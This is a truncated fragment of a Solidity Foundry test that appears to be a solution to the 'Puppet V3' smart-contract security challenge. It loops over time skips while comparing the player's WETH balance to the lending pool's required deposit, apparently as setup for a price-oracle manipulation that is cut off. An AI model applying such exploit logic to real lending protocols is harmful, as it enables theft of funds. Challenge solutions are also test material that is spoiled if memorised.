...
contract PuppetV3Challenge is Test {
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        ...
        uint256 banlance_weth = weth.balanceOf(player);
        for (uint256 i = 1; i < 115; i++) {
            skip(1);
            uint256 needAmount = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);

            if (banlance_weth > needAmount) {
